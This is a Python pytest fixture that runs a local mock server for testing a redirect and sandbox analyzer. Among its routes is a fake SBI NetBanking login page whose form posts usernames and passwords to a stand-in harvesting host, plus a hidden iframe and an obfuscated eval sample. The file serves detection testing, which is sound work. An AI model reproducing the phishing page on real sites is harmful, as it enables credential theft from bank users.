from __future__ import annotations

import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Generator
import pytest


class MockServerHandler(BaseHTTPRequestHandler):
    """Custom HTTP handler providing deterministic responses for redirect and sandbox tests."""

    def log_message(self, format: str, *args) -> None:
        # Suppress noisy standard HTTP access logs during pytest runs
        pass

    def do_GET(self) -> None:
        path = self.path

        if path == "/normal":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"<!DOCTYPE html><html><body><h1>Normal Landing Page</h1></body></html>")

        elif path == "/hop1":
            self.send_response(301)
            self.send_header("Location", "/hop2")
            self.end_headers()

        elif path == "/hop2":
            self.send_response(302)
            self.send_header("Location", "/hop3")
            self.end_headers()

        elif path == "/hop3":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"<!DOCTYPE html><html><body><h1>Terminal Hop 3</h1></body></html>")

        elif path == "/meta-start":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            html = (
                '<!DOCTYPE html><html><head>'
                '<meta http-equiv="refresh" content="0; url=/meta-target">'
                '</head><body><p>Redirecting via meta refresh...</p></body></html>'
            )
            self.wfile.write(html.encode("utf-8"))

        elif path == "/meta-target":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"<!DOCTYPE html><html><body><h1>Meta Target Page</h1></body></html>")

        elif path == "/js-start":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            html = (
                '<!DOCTYPE html><html><head><script>'
                'window.location.replace("/js-target");'
                '</script></head><body><p>Redirecting via JS...</p></body></html>'
            )
            self.wfile.write(html.encode("utf-8"))

        elif path == "/js-target":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"<!DOCTYPE html><html><body><h1>JS Target Page</h1></body></html>")

        elif path == "/loop-a":
            self.send_response(302)
            self.send_header("Location", "/loop-b")
            self.end_headers()

        elif path == "/loop-b":
            self.send_response(302)
            self.send_header("Location", "/loop-a")
            self.end_headers()

        elif path.startswith("/chain/"):
            try:
                num = int(path.split("/")[-1])
                next_num = num + 1
                self.send_response(302)
                self.send_header("Location", f"/chain/{next_num}")
                self.end_headers()
            except ValueError:
                self.send_response(400)
                self.end_headers()

        elif path == "/sandbox-phish":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            html = """<!DOCTYPE html>
<html>
<head>
    <title>SBI NetBanking Secure Login</title>
    <link rel="icon" href="/favicon.ico">
    <script src="https://cdn.external-analytics.com/tracker.js"></script>
    <script>
        console.log("local script executed");
    </script>
</head>
<body style="background-color: #f0f0f0;">
    <h1>Online SBI Verification</h1>
    <form action="https://phish-harvesting-server.xyz/collect" method="POST">
        <label>Username: <input type="text" name="user"></label>
        <label>Password: <input type="password" name="pwd"></label>
        <button type="submit" onclick="console.log('clicked')">Login</button>
    </form>
    <iframe src="/normal" width="200" height="150"></iframe>
    <iframe src="/normal" style="display:none;" width="0" height="0"></iframe>
</body>
</html>"""
            self.wfile.write(html.encode("utf-8"))

        elif path == "/sandbox-obfuscated":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            html = """<!DOCTYPE html>
<html>
<head><title>Obfuscated Test</title></head>
<body>
    <script>
        eval(unescape("%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%27%68%61%63%6b%65%64%27%29"));
    </script>
</body>
</html>"""
            self.wfile.write(html.encode("utf-8"))

        elif path == "/favicon.ico":
            self.send_response(200)
            self.send_header("Content-Type", "image/x-icon")
            self.end_headers()
            self.wfile.write(b"\x00\x00\x01\x00")

        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")


@pytest.fixture(scope="session")
def mock_server() -> Generator[str, None, None]:
    """Start an ephemeral multi-route HTTP server for offline testing."""
    server = ThreadingHTTPServer(("127.0.0.1", 0), MockServerHandler)
    host, port = server.server_address
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    base_url = f"http://{host}:{port}"

    yield base_url

    server.shutdown()
    server.server_close()
